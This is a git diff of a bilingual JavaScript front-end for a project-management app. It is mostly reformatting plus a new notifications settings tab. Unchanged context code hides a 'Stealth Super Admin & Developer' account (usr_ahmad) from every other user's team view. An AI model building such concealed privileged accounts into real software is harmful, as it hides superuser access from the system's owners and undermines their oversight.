@@ -11,7 +11,7 @@ export function renderTeam() {
   }
   const currentUserId = state.data?.user?.id;
   let users = (state.data?.users || []).filter((user) => user.status !== 'inactive');
-  
+
   // Stealth Super Admin & Developer: Ahmad is completely invisible to any other user
   if (currentUserId !== 'usr_ahmad') {
     users = users.filter(u => u.id !== 'usr_ahmad');
@@ -33,9 +33,9 @@ export function renderTeam() {
     </div>
     <div class="team-grid">
       ${users.map((user) => {
-        const metrics = teamMetrics(user.id, state.data?.tasks || []);
-        const isAhmadUser = user.id === 'usr_ahmad';
-        return `
+    const metrics = teamMetrics(user.id, state.data?.tasks || []);
+    const isAhmadUser = user.id === 'usr_ahmad';
+    return `
           <article class="member-card ${isAhmadUser ? 'system-developer-card' : ''}" style="${isAhmadUser ? 'border:2px solid var(--brand-teal);box-shadow:0 6px 20px rgba(13,148,136,0.12);' : ''}">
             <div class="member-card-head">
               <div class="member-card-person">
@@ -45,10 +45,10 @@ export function renderTeam() {
                   <span>${esc(choose(user.jobTitleAr || (isAhmadUser ? 'المبرمج / مدير النظام' : ''), user.jobTitleEn || user.jobTitleAr || ''))}</span>
                 </div>
               </div>
-              ${isAhmadUser 
-                ? `<span class="stealth-dev-badge">${icon('shield', 12)} ${choose('مدير ومطور النظام', 'Super Admin & Dev')}</span>`
-                : (canManageAccountPermissions() && user.id !== state.data?.user?.id ? `<button class="member-menu" data-action="open-user" data-user-id="${esc(user.id)}">${icon('more', 15)}</button>` : '')
-              }
+              ${isAhmadUser
+        ? `<span class="stealth-dev-badge">${icon('shield', 12)} ${choose('مدير ومطور النظام', 'Super Admin & Dev')}</span>`
+        : (canManageAccountPermissions() && user.id !== state.data?.user?.id ? `<button class="member-menu" data-action="open-user" data-user-id="${esc(user.id)}">${icon('more', 15)}</button>` : '')
+      }
             </div>
             <div class="member-card-role">
               <span class="status-badge ${user.status === 'active' ? 'done' : 'not_started'}">${esc(roleName(user))}</span>
@@ -60,7 +60,7 @@ export function renderTeam() {
             <div class="member-email">${user.email ? esc(user.email) : t('noEmail')}</div>
           </article>
         `;
-      }).join('')}
+  }).join('')}
     </div>
   `;
 }
@@ -218,7 +218,7 @@ export function exportAuditLogsXLS(logs = null) {
     const authorRole = author ? roleName(author) : '—';
     const dt = formatAuditTimestamp(log.createdAt);
     const { actionLabel, entityLabel } = renderAuditDetails(log);
-    
+
     let detailsStr = '';
     if (log.details?.title || log.details?.name) {
       detailsStr = log.details.title || log.details.name;
@@ -284,7 +284,7 @@ export function exportAuditLogsXLS(logs = null) {
       entityId: `rep_audit_${dateStamp}`,
       details: { reportType: 'Audit_Logs_Excel', count: currentLogs.length }
     })
-  }).catch(() => {});
+  }).catch(() => { });
 }
 
 export function printAuditReport(logs = null) {
@@ -578,7 +578,7 @@ export function printAuditReport(logs = null) {
       entityId: `rep_audit_print_${Date.now()}`,
       details: { reportType: 'Audit_Logs_Print_PDF', count: currentLogs.length }
     })
-  }).catch(() => {});
+  }).catch(() => { });
 }
 
 export async function fetchFullAuditHistory() {
@@ -598,7 +598,7 @@ export async function fetchFullAuditHistory() {
 
 export function canAccessSettingsSection(sectionKey) {
   const userIsAdmin = isAdmin();
-  if (sectionKey === 'profile' || sectionKey === 'security') return true;
+  if (sectionKey === 'profile' || sectionKey === 'security' || sectionKey === 'notifications') return true;
   if (sectionKey === 'company') return userIsAdmin || can('manage_settings');
   if (sectionKey === 'whatsapp') return userIsAdmin || can('manage_settings');
   if (sectionKey === 'roles') return userIsAdmin || can('manage_roles');
@@ -625,14 +625,15 @@ export function renderSettings() {
   // Granular settings tabs strictly gated by permissions
   const sections = [
     ['profile', choose('الملف الشخصي', 'Profile')],
+    ['notifications', choose('الإشعارات والتنبيهات 🔔', 'Notifications & Alerts 🔔')],
     ...(canAccessCompany ? [['company', t('company')]] : []),
-    ...(canAccessWhatsApp ? [['whatsapp', choose('تنبيهات واتساب 💬', 'WhatsApp Alerts 💬')]] : []),
+    ...(canAccessWhatsApp ? [['whatsapp', choose('تنبيهات واتساب', 'WhatsApp Alerts')]] : []),
     ...(canAccessRoles ? [['roles', t('roles')]] : []),
     ...(canAccessAccounts ? [['accounts', t('accounts')]] : []),
     ['security', choose('الأمان', 'Security')],
     ...(canAccessTrash ? [['trash', choose('سلة المهملات', 'Trash')]] : []),
     ...(canAccessAudit ? [['audit', t('audit')]] : []),
-    ...(canAccessAnalytics ? [['analytics', choose('المراقبة والزيارات والأداء 📈', 'Observability & Analytics 📈')]] : []),
+    ...(canAccessAnalytics ? [['analytics', choose('المراقبة والزيارات والأداء', 'Observability & Analytics')]] : []),
     ...(canAccessDiagnostics ? [['diagnostics', choose('تشخيص الأعطال والمستخدمين 🛠️', 'Error Logs & User Diagnostics 🛠️')]] : [])
   ];
 
@@ -658,9 +659,9 @@ export function renderSettings() {
           <label for="user-avatar-file-input" class="avatar-upload-trigger" id="profile-avatar-preview" role="button" tabindex="0" title="${choose('انقر لرفع صورة شخصية جديدة', 'Click to upload a new profile picture')}">
             <div class="avatar-upload-circle">
               ${currentUser.avatarUrl
-                ? `<img src="${esc(currentUser.avatarUrl)}" alt="Avatar" class="avatar-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><div class="avatar-upload-fallback" style="display:none;background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
-                : `<div class="avatar-upload-fallback" style="background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
-              }
+        ? `<img src="${esc(currentUser.avatarUrl)}" alt="Avatar" class="avatar-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><div class="avatar-upload-fallback" style="display:none;background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
+        : `<div class="avatar-upload-fallback" style="background:${/^#[0-9a-f]{6}$/i.test(currentUser.avatarColor || '') ? currentUser.avatarColor : '#0d6269'};">${esc(initials(currentUser))}</div>`
+      }
               <div class="avatar-upload-overlay">
                 ${icon('upload', 18)}
                 <span>${choose('تغيير', 'Change')}</span>
@@ -739,10 +740,10 @@ export function renderSettings() {
         <div class="company-preview">
           <label for="company-logo-file-input" class="logo-upload-trigger" id="company-logo-preview" role="button" tabindex="0" title="${choose('انقر لرفع وتعديل شعار الشركة', 'Click to upload and change company logo')}">
             <div class="logo-upload-box">
-              ${comp.logoUrl 
-                ? `<img src="${esc(comp.logoUrl)}" alt="Logo" class="logo-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><span class="brand-mark" style="display:none;">${icon('building', 24)}</span>`
-                : `<span class="brand-mark">${icon('building', 24)}</span>`
-              }
+              ${comp.logoUrl
+        ? `<img src="${esc(comp.logoUrl)}" alt="Logo" class="logo-upload-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" /><span class="brand-mark" style="display:none;">${icon('building', 24)}</span>`
+        : `<span class="brand-mark">${icon('building', 24)}</span>`
+      }
               <div class="logo-upload-overlay">
                 ${icon('upload', 16)}
                 <span>${choose('تعديل', 'Edit')}</span>
@@ -827,6 +828,103 @@ export function renderSettings() {
     `;
   }
 
+  // NOTIFICATIONS SECTION (All users)
+  if (state.settingsSection === 'notifications') {
+    const perm = typeof window !== 'undefined' && 'Notification' in window ? Notification.permission : 'unsupported';
+    const isGranted = perm === 'granted';
+    const isDenied = perm === 'denied';
+
+    content = `
+      <section class="setting-section">
+        <div class="panel-head">
+          <div>
+            <h2>${choose('الإشعارات والتنبيهات', 'Notifications & Alerts')}</h2>
+            <p>${choose('تخصيص قنوات وصول التنبيهات الفورية وإشعارات المتصفح لسطح المكتب.', 'Configure your real-time notification channels and desktop alerts.')}</p>
+          </div>
+          <button type="button" class="btn btn-primary btn-sm" data-action="send-test-notification">
+            ${icon('bell', 14)} ${choose('إرسال إشعار تجريبي فوري', 'Send Test Notification')}
+          </button>
+        </div>
+
+        <div style="display:grid;gap:16px;margin-top:16px;">
+          <!-- 1. Browser Web Notifications Card -->
+          <div style="padding:16px;border-radius:14px;border:1px solid var(--line);background:var(--surface);display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
+            <div style="display:flex;align-items:flex-start;gap:12px;">
+              <span class="attention-icon ${isGranted ? 'teal' : isDenied ? 'red' : 'blue'}" style="margin-top:2px;">
+                ${icon('bell', 16)}
+              </span>
+              <div>
+                <strong style="display:block;font-size:13px;color:var(--ink);margin-bottom:3px;">
+                  ${choose('إشعارات سطح المكتب والمتصفح (Web Push Alerts)', 'Desktop & Browser Web Notifications')}
+                </strong>
+                <p style="margin:0;font-size:11px;color:var(--muted);max-width:480px;line-height:1.5;">
+                  ${choose('تسمح للموقع بإرسال تنبيهات فورية للنظام حتى عندما يكون المتصفح في الخلفية أو تعمل على نافذة أخرى.', 'Allows the platform to deliver native desktop notifications even when you are in another tab or window.')}
+                </p>
+                <div style="margin-top:6px;">
+                  <span class="mini-badge" style="background:${isGranted ? 'var(--mint)' : isDenied ? 'var(--red-soft)' : 'var(--surface-soft)'};color:${isGranted ? 'var(--teal)' : isDenied ? 'var(--red)' : 'var(--muted)'};font-weight:700;">
+                    ${isGranted ? choose('مفعلة على هذا المتصفح ✅', 'Enabled on this browser ✅') : isDenied ? choose('محظورة من إعدادات المتصفح ❌', 'Blocked in browser settings ❌') : choose('بانتظار الموافقة ⚠️', 'Permission pending ⚠️')}
+                  </span>
+                </div>
+              </div>
+            </div>
+            <div>
+              ${!isGranted ? `
+                <button type="button" class="btn btn-primary btn-sm" data-action="enable-browser-notifications">
+                  ${icon('check', 14)} ${choose('تفعيل الإشعارات الآن', 'Enable Notifications')}
+                </button>
+              ` : `
+                <button type="button" class="btn btn-ghost btn-sm" data-action="test-browser-notification" style="color:var(--teal);">
+                  ${icon('check', 14)} ${choose('فحص إشعار المتصفح', 'Test Browser Alert')}
+                </button>
+              `}
+            </div>
+          </div>
+
+          <!-- 2. Audio Chimes Card -->
+          <div style="padding:16px;border-radius:14px;border:1px solid var(--line);background:var(--surface);display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
+            <div style="display:flex;align-items:flex-start;gap:12px;">
+              <span class="attention-icon teal" style="margin-top:2px;">
+                ${icon('check', 16)}
+              </span>
+              <div>
+                <strong style="display:block;font-size:13px;color:var(--ink);margin-bottom:3px;">
+                  ${choose('النغمة التنبيهية الفاخرة (Audio Chime)', 'Acoustic Alert Chime')}
+                </strong>
+                <p style="margin:0;font-size:11px;color:var(--muted);max-width:480px;line-height:1.5;">
+                  ${choose('نغمة صوتية هادئة مدمجة باستخدام Web Audio API تعزف فورياً عند وصول أي تنبيه في الوقت الفعلي.', 'Subtle built-in harmonic chime generated via Web Audio API playing whenever a live alert arrives.')}
+                </p>
+              </div>
+            </div>
+            <button type="button" class="btn btn-soft btn-sm" data-action="play-test-chime">
+              🔊 ${choose('استمع للنغمة', 'Play Chime')}
+            </button>
+          </div>
+
+          <!-- 3. Channel Status Matrix -->
+          <div style="padding:16px;border-radius:14px;border:1px solid var(--line);background:var(--surface);">
+            <strong style="display:block;font-size:13px;color:var(--ink);margin-bottom:8px;">
+              ${choose('جاهزية قنوات الإرسال المربوطة', 'Connected Notification Channels')}
+            </strong>
+            <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:10px;margin-top:10px;">
+              <div style="padding:10px;border-radius:10px;background:var(--surface-soft);border:1px solid var(--line);">
+                <span style="font-size:10px;color:var(--muted);display:block;">${choose('التنبيهات داخل المنصة', 'In-App Alerts')}</span>
+                <strong style="color:var(--teal);font-size:12px;">✅ ${choose('نشطة وفورية (WebSocket)', 'Active Real-Time')}</strong>
+              </div>
+              <div style="padding:10px;border-radius:10px;background:var(--surface-soft);border:1px solid var(--line);">
+                <span style="font-size:10px;color:var(--muted);display:block;">${choose('تنبيهات واتساب المباشرة', 'WhatsApp Direct Alerts')}</span>
+                <strong style="color:var(--teal);font-size:12px;">✅ ${choose('مربوطة (Baileys Engine)', 'Connected Baileys')}</strong>
+              </div>
+              <div style="padding:10px;border-radius:10px;background:var(--surface-soft);border:1px solid var(--line);">
+                <span style="font-size:10px;color:var(--muted);display:block;">${choose('بريد الإشعارات السحابي', 'Cloud Email Gateway')}</span>
+                <strong style="color:var(--teal);font-size:12px;">✅ ${choose('جاهز (Resend API)', 'Ready Resend')}</strong>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    `;
+  }
+
   // ACCOUNTS SECTION (Admin or users with manage_users / view_user_activity)
   if (state.settingsSection === 'accounts' && canAccessAccounts) {
     const canSeeActivity = isAdmin() || can('view_user_activity');
@@ -862,8 +960,8 @@ export function renderSettings() {
             </thead>
             <tbody>
               ${accountsList.map((user) => {
-                const isAhmad = user.id === 'usr_ahmad';
-                return `
+      const isAhmad = user.id === 'usr_ahmad';
+      return `
                   <tr>
                     <td>
                       <div class="team-member">
@@ -908,7 +1006,7 @@ export function renderSettings() {
                     ` : ''}
                   </tr>
                 `;
-              }).join('')}
+    }).join('')}
             </tbody>
           </table>
         </div>
@@ -958,16 +1056,16 @@ export function renderSettings() {
         if (cached) {
           state.trash = JSON.parse(cached);
         }
-      } catch (e) {}
+      } catch (e) { }
     }
 
     if (!state.trashLoaded && !state._trashFetching) {
       state._trashFetching = true;
       api('/api/trash').then(data => {
         state.trash = Array.isArray(data) ? data : (data.trash || [
-          ...(data.projects || []).map(p => ({...p, type:'project'})),
-          ...(data.tasks || []).map(t => ({...t, type:'task'})),
-          ...(data.documents || []).map(d => ({...d, type:'document'}))
+          ...(data.projects || []).map(p => ({ ...p, type: 'project' })),
+          ...(data.tasks || []).map(t => ({ ...t, type: 'task' })),
+          ...(data.documents || []).map(d => ({ ...d, type: 'document' }))
         ]);
         state.trashLoaded = true;
         state._trashFetching = false;
@@ -975,7 +1073,7 @@ export function renderSettings() {
           if (typeof sessionStorage !== 'undefined') {
             sessionStorage.setItem('darc_trash_cache', JSON.stringify(state.trash));
           }
-        } catch (e) {}
+        } catch (e) { }
         if (typeof window.renderView === 'function') window.renderView();
       }).catch(err => {
         state._trashFetching = false;
@@ -1045,24 +1143,24 @@ export function renderSettings() {
             </thead>
             <tbody>
               ${filteredItems.map((item) => {
-                const isProject = item.type === 'project';
-                const isTask = item.type === 'task';
-                const isDoc = item.type === 'document';
+      const isProject = item.type === 'project';
+      const isTask = item.type === 'task';
+      const isDoc = item.type === 'document';
 
-                const displayName = choose(item.nameAr || item.titleAr, item.nameEn || item.titleEn) || item.name || item.title || item.originalName || item.code || choose('عنصر محذوف', 'Deleted item');
-                const parentProject = !isProject && item.projectId ? (state.data?.projects || []).find(p => p.id === item.projectId) : null;
-                const parentDisplayName = item.projectNameAr || item.projectNameEn || (parentProject ? choose(parentProject.nameAr, parentProject.nameEn || parentProject.nameAr) : null);
-                const parentCode = item.projectCode || parentProject?.code;
+      const displayName = choose(item.nameAr || item.titleAr, item.nameEn || item.titleEn) || item.name || item.title || item.originalName || item.code || choose('عنصر محذوف', 'Deleted item');
+      const parentProject = !isProject && item.projectId ? (state.data?.projects || []).find(p => p.id === item.projectId) : null;
+      const parentDisplayName = item.projectNameAr || item.projectNameEn || (parentProject ? choose(parentProject.nameAr, parentProject.nameEn || parentProject.nameAr) : null);
+      const parentCode = item.projectCode || parentProject?.code;
 
-                const sizeFormatted = isDoc && item.size ? (
-                  item.size > 1024 * 1024 
-                    ? (item.size / (1024 * 1024)).toFixed(1) + ' MB' 
-                    : Math.round(item.size / 1024) + ' KB'
-                ) : '';
+      const sizeFormatted = isDoc && item.size ? (
+        item.size > 1024 * 1024
+          ? (item.size / (1024 * 1024)).toFixed(1) + ' MB'
+          : Math.round(item.size / 1024) + ' KB'
+      ) : '';
 
-                const canPurge = userIsAdmin || can('manage_trash') || item.uploaderId === currentUserId;
+      const canPurge = userIsAdmin || can('manage_trash') || item.uploaderId === currentUserId;
 
-                return `
+      return `
                   <tr class="trash-row">
                     <td>
                       <div class="trash-item-cell">
@@ -1084,13 +1182,13 @@ export function renderSettings() {
                     </td>
                     <td>
                       <span class="trash-parent-badge">
-                        ${isProject 
-                          ? `<span class="mini-badge" style="background:var(--mint);color:var(--teal);">${choose('مشروع رئيسي', 'Primary Project')}</span>` 
-                          : (parentDisplayName 
-                              ? `${icon('building', 11)} <span>${esc(parentDisplayName)}${parentCode ? ` (${esc(parentCode)})` : ''}</span>${isDoc && item.taskTitleAr ? ` <span style="font-size:11px;color:var(--muted)">· ${esc(item.taskTitleAr)}</span>` : ''}` 
-                              : `<span style="color:var(--muted)">—</span>`
-                            )
-                        }
+                        ${isProject
+          ? `<span class="mini-badge" style="background:var(--mint);color:var(--teal);">${choose('مشروع رئيسي', 'Primary Project')}</span>`
+          : (parentDisplayName
+            ? `${icon('building', 11)} <span>${esc(parentDisplayName)}${parentCode ? ` (${esc(parentCode)})` : ''}</span>${isDoc && item.taskTitleAr ? ` <span style="font-size:11px;color:var(--muted)">· ${esc(item.taskTitleAr)}</span>` : ''}`
+            : `<span style="color:var(--muted)">—</span>`
+          )
+        }
                       </span>
                     </td>
                     <td>
@@ -1115,7 +1213,7 @@ export function renderSettings() {
                     </td>
                   </tr>
                 `;
-              }).join('')}
+    }).join('')}
             </tbody>
           </table>
         </div>
@@ -1188,12 +1286,12 @@ export function renderSettings() {
         const entityStr = (entityLabel || log.entityType || '').toLowerCase();
         const idStr = (log.id || log.entityId || '').toLowerCase();
         const detailsStr = typeof log.details === 'object' ? JSON.stringify(log.details).toLowerCase() : String(log.details || '').toLowerCase();
-        
-        const match = authorName.includes(searchQuery) || 
-                      actionStr.includes(searchQuery) || 
-                      entityStr.includes(searchQuery) || 
-                      idStr.includes(searchQuery) || 
-                      detailsStr.includes(searchQuery);
+
+        const match = authorName.includes(searchQuery) ||
+          actionStr.includes(searchQuery) ||
+          entityStr.includes(searchQuery) ||
+          idStr.includes(searchQuery) ||
+          detailsStr.includes(searchQuery);
         if (!match) return false;
       }
       return true;
@@ -1296,14 +1394,14 @@ export function renderSettings() {
               </thead>
               <tbody>
                 ${filteredLogs.map((log) => {
-                  const author = log.user || (log.userId ? (state.data?.users || []).find(u => u.id === log.userId) : null);
-                  const authorName = author ? choose(author.name, author.nameEn || author.name) : choose('النظام', 'System');
-                  const authorRole = author ? roleName(author) : choose('تلقائي', 'Automated');
-                  
-                  const dt = formatAuditTimestamp(log.createdAt);
-                  const { badgeClass, actionLabel, entityLabel, detailHtml } = renderAuditDetails(log);
+      const author = log.user || (log.userId ? (state.data?.users || []).find(u => u.id === log.userId) : null);
+      const authorName = author ? choose(author.name, author.nameEn || author.name) : choose('النظام', 'System');
+      const authorRole = author ? roleName(author) : choose('تلقائي', 'Automated');
 
-                  return `
+      const dt = formatAuditTimestamp(log.createdAt);
+      const { badgeClass, actionLabel, entityLabel, detailHtml } = renderAuditDetails(log);
+
+      return `
                     <tr style="border-bottom:1px solid var(--line);transition:background 0.15s ease;">
                       <td style="padding:12px 14px;vertical-align:middle;">
                         <div style="display:flex;align-items:center;gap:10px;">
@@ -1334,7 +1432,7 @@ export function renderSettings() {
                       </td>
                     </tr>
                   `;
-                }).join('')}
+    }).join('')}
               </tbody>
             </table>
           </div>
@@ -1394,8 +1492,8 @@ export function renderSettings() {
             <div class="field">
               <label>${choose('نوع مزود البوابة (Provider)', 'Gateway Provider')}</label>
               <select name="provider" class="select-compact" style="width:100%;height:42px;">
-                <option value="evolution" ${wa.provider !== 'webhook' ? 'selected' : ''}>Evolution API / Baileys (بروتوكول ويب - أقل ريسك 🏆)</option>
-                <option value="webhook" ${wa.provider === 'webhook' ? 'selected' : ''}>Webhook مخصص (Custom Webhook URL)</option>
+                <option value="evolution" ${wa.provider !== 'webhook' ? 'selected' : ''}>Evolution API / Baileys</option>
+                <option value="webhook" ${wa.provider === 'webhook' ? 'selected' : ''}>Webhook (Custom Webhook URL)</option>
               </select>
             </div>
 
